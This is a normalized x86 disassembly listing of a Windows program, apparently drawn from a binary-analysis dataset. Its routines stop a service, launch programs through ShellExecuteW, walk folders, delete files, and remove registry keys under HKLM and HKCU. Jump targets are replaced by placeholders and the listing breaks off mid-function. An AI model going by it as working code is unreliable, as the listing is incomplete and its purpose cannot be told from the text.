lea ecx [ ebp - 0x134 ]
call sub_4022ce
jmp r-xdata
lea ecx [ ebp - 0x14c ]
call sub_40203c
push edi
lea eax [ ebp - 0x11c ]
push esi
push eax
call sub_40f268
add esp 0xc
test eax eax
jne r-xdata
dec eax
cmp eax esi
jae r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
jmp r-xdata
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
add esi 0x18
cmp esi ebx
jne r-xdata
call sub_40f651
mov [ ebp + eax - 0x11c ] bl
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
jmp r-xdata
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
jmp r-xdata
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
jmp r-xdata
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
jmp r-xdata
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ ebp - 0x17c ]
push eax
call sub_40d6c8
push 0x0
push 0x1
lea ecx [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x4
call sub_4023e7
jmp r-xdata
push eax
lea ecx [ ebp - 0x17c ]
call sub_402085
mov [ ebp - 0x4 ] 0x5
lea ecx [ edi + 0x50 ]
jmp r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push eax
lea ecx [ ebp - 0x17c ]
call sub_402085
mov [ ebp - 0x4 ] 0x6
lea ecx [ edi + 0x74 ]
jmp r-xdata
cmp [ ebp - 0x120 ] 0x8
lea eax [ ebp - 0x134 ]
cmovae eax [ ebp - 0x134 ]
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
mov eax esi
mov eax [ esi ]
jmp r-xdata
push eax
lea ecx [ ebp - 0x17c ]
call sub_402085
mov [ ebp - 0x4 ] 0x7
lea ecx [ edi + 0x5c ]
jmp r-xdata
push eax
lea ecx [ ebp - 0x17c ]
call sub_402085
mov [ ebp - 0x4 ] 0x8
lea ecx [ edi + 0x68 ]
sub_40c0ed
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40e09b
leave
retn
push 0xf01ff
push r--data
push edi
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ QueryServiceStatus@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
cmp [ ebp - 0x1c ] 0x4
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x1
push esi
call [ ControlService@IAT ]
sub_40c169
push esi
push edi
mov edi ecx
mov esi [ edi + 0x50 ]
jmp r-xdata
cmp esi [ edi + 0x54 ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx r--data
call sub_40dd89
mov ecx r--data
call sub_40dd89
mov ecx r--data
call sub_40dd89
pop edi
mov ecx r--data
pop esi
jmp sub_40dd89
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
call sub_40dd89
add esi 0x18
sub_40c1b5
push 0x74
mov eax sub_41d5e4
call sub_41089b
mov esi ecx
xor eax eax
xor ebx ebx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
call sub_4022ce
lea eax [ esi + 0x20 ]
push eax
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] ebx
call sub_40205d
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x34 ]
dec eax
push eax
lea ecx [ ebp - 0x44 ]
call sub_40d672
cmp [ eax ] 0x5c
je r-xdata
push 0xffffffff
push ebx
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_4024a4
push r--data
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x5c ]
call sub_402bb0
pop ecx
mov esi r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x44 ]
call sub_402546
cmp [ ebp - 0x48 ] 0x8
mov esi [ PathFileExistsW@IAT ]
lea eax [ ebp - 0x5c ]
cmovae eax [ ebp - 0x5c ]
push eax
call esi
cmp [ ebp - 0x30 ] 0x8
lea ecx [ ebp - 0x44 ]
cmovae ecx [ ebp - 0x44 ]
push ecx
mov edi eax
call esi
push r--data
mov esi eax
call [ GetModuleHandleW@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x44 ]
call sub_402546
lea eax [ ebp - 0x80 ]
push eax
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x80 ]
push ecx
call eax
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x80 ] 0x6
jne r-xdata
cmp [ ebp - 0x80 ] 0x9
je r-xdata
test esi esi
je r-xdata
push 0xffffffff
push ebx
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_4024a4
cmp [ ebp - 0x18 ] 0x8
push ebx
push ebx
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push eax
push r--data
push ebx
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ ebp - 0x5c ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4023e7
call sub_41084a
retn
push 0xffffffff
push ebx
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_4024a4
mov edi r--data
mov ecx edi
mov esi eax
call sub_40102f
push eax
push edi
mov ecx esi
call sub_402546
cmp [ ebp - 0x18 ] 0x8
push ebx
push ebx
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
push eax
push r--data
push ebx
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ ebp - 0x44 ]
call sub_40d2d9
sub_40c360
push 0xadc
mov eax sub_41d6f1
call sub_41089b
mov ebx ecx
mov [ ebp - 0xa9c ] ebx
lea eax [ ebp - 0x628 ]
push eax
xor edi edi
push edi
push edi
push 0x17
push edi
call [ SHGetFolderPathW@IAT ]
xor eax eax
push 0x206
mov [ ebp - 0x420 ] ax
lea eax [ ebp - 0x41e ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x420 ]
push 0x104
push eax
call [ GetSystemDirectoryW@IAT ]
mov esi [ ebx + 0x5c ]
jmp r-xdata
cmp esi [ ebx + 0x60 ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea esi [ ebx + 0x20 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp - 0x848 ]
call sub_40234d
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
add ebx 0x20
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
push eax
lea ecx [ ebp - 0x848 ]
call sub_402085
mov [ ebp - 0x4 ] edi
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp - 0x848 ]
call sub_40234d
mov [ ebp - 0xaa0 ] eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov esi 0x206
push esi
mov [ ebp - 0x218 ] ax
lea eax [ ebp - 0x216 ]
push edi
push eax
call sub_414160
add esp 0xc
xor eax eax
push esi
mov [ ebp - 0x830 ] ax
lea eax [ ebp - 0x82e ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x830 ]
push eax
push edi
push edi
push 0x1a
push edi
call [ SHGetFolderPathW@IAT ]
mov esi [ PathCombineW@IAT ]
test eax eax
js r-xdata
xor eax eax
mov [ ebp - 0x834 ] 0x7
mov [ ebp - 0x838 ] edi
mov [ ebp - 0x848 ] ax
xor ebx ebx
inc ebx
push r--data
mov edx esi
lea ecx [ ebp - 0xab8 ]
mov [ ebp - 0x4 ] ebx
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov ebx r--data
mov ecx ebx
call sub_40102f
push eax
push ecx
push ebx
lea ecx [ ebp - 0x848 ]
call sub_40234d
mov edi eax
cmp edi 0xffffffff
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ecx [ ebp - 0x628 ]
mov edi eax
call sub_40102f
push eax
lea eax [ ebp - 0x628 ]
push eax
push edi
push ebx
lea ecx [ ebp - 0x848 ]
call sub_402d76
push edi
call [ lstrlenW@IAT ]
mov ecx ebx
mov edi eax
call sub_40102f
push eax
push ebx
push edi
push [ ebp - 0xaa0 ]
lea ecx [ ebp - 0x848 ]
call sub_402d76
mov ebx [ ebx ]
push 0x208
lea eax [ ebp - 0x218 ]
push edi
push eax
call sub_414160
lea eax [ ebx + 0x8 ]
add esp 0xc
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push r--data
lea eax [ ebp - 0x830 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
call esi
lea eax [ ebp - 0x218 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov edi [ FindFirstFileW@IAT ]
lea ecx [ ebp - 0xa98 ]
push ecx
push eax
call edi
push 0x0
push ebx
lea ecx [ ebp - 0xab8 ]
call sub_4023e7
push r--data
mov edx esi
lea ecx [ ebp - 0xab8 ]
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
mov eax [ eax ]
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp - 0x848 ]
call sub_40234d
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push ebx
call [ lstrlenW@IAT ]
mov ecx [ ebp - 0xa9c ]
push 0xffffffff
push 0x0
add ecx 0x8
push ecx
push eax
push edi
lea ecx [ ebp - 0x848 ]
call sub_40303b
push eax
lea eax [ ebp - 0x628 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
call esi
test eax eax
je r-xdata
mov eax [ eax ]
xor eax eax
mov [ ebp - 0x848 ] ax
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x848 ]
mov [ ebp - 0x834 ] 0x7
mov [ ebp - 0x838 ] edi
call sub_4022ce
lea ecx [ ebp - 0x848 ]
mov [ ebp - 0x4 ] 0x3
call sub_40d05d
or [ ebp - 0x4 ] 0xffffffff
push edi
push 0x1
lea ecx [ ebp - 0x848 ]
call sub_4023e7
lea ecx [ ebp - 0xa98 ]
push ecx
push eax
call edi
push 0x0
push ebx
lea ecx [ ebp - 0xab8 ]
mov edi eax
call sub_4023e7
mov ebx [ FindNextFileW@IAT ]
jmp r-xdata
mov eax [ eax ]
cmp [ ebp - 0x834 ] 0x8
lea eax [ ebp - 0x848 ]
cmovae eax [ ebp - 0x848 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ecx [ ebp - 0x420 ]
mov edi eax
call sub_40102f
push eax
lea eax [ ebp - 0x420 ]
push eax
push edi
push ebx
lea ecx [ ebp - 0x848 ]
call sub_402d76
call sub_41084a
retn
lea eax [ ebp - 0x218 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa98 ]
push eax
push edi
call ebx
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x848 ]
call sub_4023e7
mov ebx [ ebp - 0xa9c ]
add esi 0x18
cmp [ ebp - 0x834 ] 0x8
lea eax [ ebp - 0x848 ]
cmovae eax [ ebp - 0x848 ]
push eax
call [ PathIsDirectoryW@IAT ]
lea ecx [ ebp - 0x848 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0xab8 ] ax
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0xab8 ]
mov [ ebp - 0xaa4 ] 0x7
mov [ ebp - 0xaa8 ] edi
call sub_4022ce
lea ecx [ ebp - 0xab8 ]
mov [ ebp - 0x4 ] 0x4
call sub_40d05d
push edi
push 0x1
lea ecx [ ebp - 0xab8 ]
call sub_4023e7
cmp [ ebp - 0xa6c ] 0x2e
je r-xdata
push edi
call [ FindClose@IAT ]
or [ ebp - 0x4 ] 0xffffffff
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x848 ]
call sub_4023e7
mov ebx [ ebp - 0xa9c ]
call sub_40d2d9
call sub_40d05d
jmp r-xdata
push r--data
mov edx esi
lea ecx [ ebp - 0xad0 ]
call sub_402bb0
pop ecx
lea ecx [ ebp - 0xa6c ]
push ecx
mov edx eax
lea ecx [ ebp - 0xae8 ]
mov [ ebp - 0x4 ] 0x2
call sub_409419
pop ecx
push eax
lea ecx [ ebp - 0x848 ]
call sub_4020cf
push 0x0
push 0x1
lea ecx [ ebp - 0xae8 ]
call sub_4023e7
push 0x0
push 0x1
lea ecx [ ebp - 0xad0 ]
mov [ ebp - 0x4 ] 0x1
call sub_4023e7
test [ ebp - 0xa98 ] 0x10
lea ecx [ ebp - 0x848 ]
je r-xdata
call sub_40d2d9
call sub_40d05d
jmp r-xdata
sub_40c845
push 0x494
mov eax sub_41d79e
call sub_41089b
mov ebx ecx
mov [ ebp - 0x4a0 ] ebx
lea eax [ ebx + 0x20 ]
push eax
lea ecx [ ebp - 0x468 ]
call sub_40205d
xor edi edi
mov [ ebp - 0x4 ] edi
xor eax eax
mov [ ebp - 0x43c ] 0x7
mov [ ebp - 0x440 ] edi
mov [ ebp - 0x450 ] ax
mov esi 0x206
mov [ ebp - 0x4 ] 0x1
push esi
mov [ ebp - 0x218 ] ax
lea eax [ ebp - 0x216 ]
push edi
push eax
call sub_414160
add esp 0xc
xor eax eax
push esi
mov [ ebp - 0x420 ] ax
lea eax [ ebp - 0x41e ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x420 ]
push eax
push edi
push edi
push 0x1a
push edi
call [ SHGetFolderPathW@IAT ]
test eax eax
js r-xdata
mov esi [ ebx + 0x68 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x420 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
call [ PathCombineW@IAT ]
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x450 ]
call sub_4022ce
mov eax [ ebp - 0x440 ]
dec eax
push eax
lea ecx [ ebp - 0x450 ]
call sub_40d672
cmp [ eax ] 0x5c
jne r-xdata
cmp esi [ ebx + 0x6c ]
jne r-xdata
mov eax [ ebp - 0x440 ]
dec eax
push eax
lea ecx [ ebp - 0x450 ]
call sub_4025e7
cmp [ esi + 0x14 ] 0x8
mov edi r--data
jb r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x450 ]
call sub_4023e7
push edi
push 0x1
lea ecx [ ebp - 0x468 ]
call sub_4023e7
call sub_41084a
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp - 0x440 ] 0x0
je r-xdata
cmp [ ebp - 0x454 ] 0x8
lea ebx [ ebp - 0x468 ]
cmovae ebx [ ebp - 0x468 ]
push edi
call [ lstrlenW@IAT ]
mov ecx ebx
mov edi eax
call sub_40102f
push eax
push ebx
push edi
push [ ebp - 0x49c ]
lea ecx [ ebp - 0x438 ]
call sub_402d76
mov ebx [ ebp - 0x4a0 ]
push eax
lea ecx [ ebp - 0x438 ]
call sub_402085
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp - 0x438 ]
call sub_40234d
mov [ ebp - 0x49c ] eax
cmp eax 0xffffffff
je r-xdata
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp - 0x438 ]
call sub_40234d
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp - 0x438 ]
call sub_40234d
mov [ ebp - 0x49c ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x424 ] 0x8
lea eax [ ebp - 0x438 ]
cmovae eax [ ebp - 0x438 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push edi
push 0x0
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x438 ]
call sub_40d697
push 0xffffffff
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebp - 0x498 ]
push eax
lea ecx [ ebp - 0x438 ]
mov [ ebp - 0x4 ] 0x3
call sub_40d697
lea edx [ ebp - 0x498 ]
lea ecx [ ebp - 0x480 ]
mov [ ebp - 0x4 ] 0x4
call sub_40d358
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x498 ]
call sub_4023e7
push edi
push 0x1
lea ecx [ ebp - 0x480 ]
call sub_4023e7
jmp r-xdata
push edi
call [ lstrlenW@IAT ]
lea ecx [ ebp - 0x218 ]
mov edi eax
call sub_40102f
push eax
lea eax [ ebp - 0x218 ]
push eax
push edi
push [ ebp - 0x49c ]
lea ecx [ ebp - 0x438 ]
call sub_402d76
xor edi edi
lea ecx [ ebp - 0x438 ]
call sub_40d2d9
push edi
push 0x1
lea ecx [ ebp - 0x438 ]
mov [ ebp - 0x4 ] 0x1
call sub_4023e7
add esi 0x18
sub_40cb07
push 0x22c
mov eax sub_41d843
call sub_41089b
mov ebx ecx
xor eax eax
push 0x206
mov [ ebp - 0x21c ] ax
xor edi edi
lea eax [ ebp - 0x21a ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x21c ]
push eax
push edi
push edi
push 0x10
push edi
call [ SHGetFolderPathW@IAT ]
test eax eax
js r-xdata
call sub_41084a
retn
mov esi [ ebx + 0x74 ]
jmp r-xdata
cmp esi [ ebx + 0x78 ]
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp - 0x224 ] 0x0
je r-xdata
push r--data
call [ lstrlenW@IAT ]
lea ecx [ ebp - 0x21c ]
mov edi eax
call sub_40102f
push eax
lea eax [ ebp - 0x21c ]
push eax
push edi
push [ ebp - 0x238 ]
lea ecx [ ebp - 0x234 ]
call sub_402d76
xor edi edi
push eax
lea ecx [ ebp - 0x234 ]
call sub_402085
mov ecx r--data
mov [ ebp - 0x4 ] edi
call sub_40102f
push eax
push ecx
push r--data
lea ecx [ ebp - 0x234 ]
call sub_40234d
mov [ ebp - 0x238 ] eax
cmp eax 0xffffffff
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
push edi
push 0x1
lea ecx [ ebp - 0x234 ]
call sub_4023e7
add esi 0x18
cmp [ ebp - 0x220 ] 0x8
lea eax [ ebp - 0x234 ]
cmovae eax [ ebp - 0x234 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x220 ] 0x8
lea eax [ ebp - 0x234 ]
cmovae eax [ ebp - 0x234 ]
push eax
call [ DeleteFileW@IAT ]
sub_40cc37
push 0x64
mov eax sub_41d7de
call sub_41089b
mov esi ecx
push 0x7
pop edi
xor eax eax
xor ebx ebx
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x40 ] ax
call sub_4022ce
mov [ ebp - 0x4 ] ebx
xor eax eax
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] ax
call sub_4022ce
add esi 0x8
push esi
mov edx r--data
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_40d92a
mov [ ebp - 0x4 ] 0x2
xor eax eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] ax
mov [ esp ] r--data
call sub_4022ce
cmp [ ebp - 0x14 ] 0x8
mov edi [ SHDeleteKeyW@IAT ]
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
mov ebx 0x80000002
push ebx
call edi
cmp [ ebp - 0x2c ] 0x8
lea eax [ ebp - 0x40 ]
cmovae eax [ ebp - 0x40 ]
push eax
push ebx
call edi
cmp [ ebp - 0x5c ] 0x8
lea eax [ ebp - 0x70 ]
cmovae eax [ ebp - 0x70 ]
push eax
push ebx
call edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ ebp - 0x44 ] 0x8
lea eax [ ebp - 0x58 ]
cmovae eax [ ebp - 0x58 ]
test esi esi
je r-xdata
mov esi [ esi ]
push eax
push 0x80000001
call edi
push esi
push eax
push 0x80000001
call [ SHDeleteValueW@IAT ]
jmp r-xdata
xor esi esi
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x58 ]
call sub_4023e7
push esi
push ebx
lea ecx [ ebp - 0x70 ]
call sub_4023e7
push esi
push ebx
lea ecx [ ebp - 0x28 ]
call sub_4023e7
push esi
push ebx
lea ecx [ ebp - 0x40 ]
call sub_4023e7
call sub_41084a
retn
sub_40cd4c
push 0x88
mov eax sub_41d64f
call sub_41089b
mov esi edx
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
or [ ebx ] 0xffffffff
and [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor bl bl
lea eax [ ebp + 0xc ]
push eax
xor edi edi
push edi
lea ecx [ ebp - 0x18 ]
call sub_40de2a
test al al
je r-xdata
xor edx edx
mov [ eax ] dx
and [ ebp - 0x18 ] edx
and [ ebp - 0x14 ] edx
push ecx
mov edx r--data
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_40d92a
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x68 ] 0x8
lea eax [ ebp - 0x7c ]
cmovae eax [ ebp - 0x7c ]
mov [ esp ] 0x20019
push eax
push 0x80000000
lea ecx [ ebp - 0x18 ]
call sub_40ddfb
test al al
je r-xdata
mov edx [ rw-data ]
cmp [ ebp + 0x1c ] edx
mov ecx edx
cmovb ecx [ ebp + 0x1c ]
cmp [ ebp + 0x20 ] 0x8
push ecx
lea eax [ ebp + 0xc ]
cmovae eax [ ebp + 0xc ]
push eax
push edx
push ecx
mov ecx rw-data
call sub_402ee3
test eax eax
jne r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40ddd3
xor eax eax
push r--data
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] 0x7
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x34 ] ax
call sub_4022ce
push r--data
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x3
call sub_402bb0
lea ecx [ ebp - 0x34 ]
push ecx
mov edx eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_4094d7
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x94 ]
call sub_4023e7
push edi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x7
call sub_4023e7
cmp [ ebp - 0x50 ] 0x8
lea eax [ ebp - 0x64 ]
cmovae eax [ ebp - 0x64 ]
push 0x20019
push eax
push 0x80000000
lea ecx [ ebp - 0x18 ]
call sub_40ddfb
test al al
jne r-xdata
and [ ebp - 0x3c ] 0x0
xor eax eax
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x4c ] ax
lea eax [ ebp - 0x4c ]
push eax
push 0x0
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x8
call sub_40de2a
test al al
je r-xdata
xor bl bl
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
mov bl 0x1
call sub_4023e7
push ecx
push ecx
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x1c ] 0x2c
call sub_40d76b
mov edi eax
lea eax [ ebp - 0x4c ]
cmp esi eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_4023e7
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x7c ]
call sub_4023e7
lea ecx [ ebp - 0x18 ]
call sub_40ddd3
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_4023e7
mov al bl
call sub_41084a
retn
cmp edi 0xffffffff
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_40223f
push 0xffffffff
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x4c ]
call sub_40d697
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x20 ] 0x8
lea eax [ ebp - 0x34 ]
cmovae eax [ ebp - 0x34 ]
push eax
call sub_40eb46
pop ecx
mov [ ebx ] eax
push edi
xor ebx ebx
push ebx
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x4c ]
call sub_40d697
push eax
mov ecx esi
call sub_4020cf
push ebx
push 0x1
lea ecx [ ebp - 0x94 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x34 ]
call sub_4023e7
sub_40cf9b
push 0x54
mov eax sub_41d813
call sub_41089b
mov esi ecx
push 0x7
pop ecx
xor edi edi
xor eax eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x5c ] ax
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x44 ] ax
sub esp 0x18
lea eax [ ebp - 0x5c ]
mov ecx esp
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40205d
lea eax [ ebp - 0x60 ]
push eax
lea edx [ ebp - 0x44 ]
mov ecx esi
call sub_40cd4c
add esp 0x1c
test al al
je r-xdata
push esi
lea ecx [ ebp - 0x2c ]
call sub_40d994
cmp [ ebp - 0x18 ] 0x8
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
pop ecx
push eax
call sub_40ac3b
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4023e7
push edi
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_4023e7
push edi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_4023e7
call sub_41084a
retn
push esi
mov edx r--data
lea ecx [ ebp - 0x2c ]
call sub_40d92a
cmp [ ebp - 0x18 ] 0x8
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
pop ecx
push eax
call sub_40ac3b
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4023e7
sub_40d05d
push 0x2cc
mov eax sub_41d692
call sub_41089b
mov esi ecx
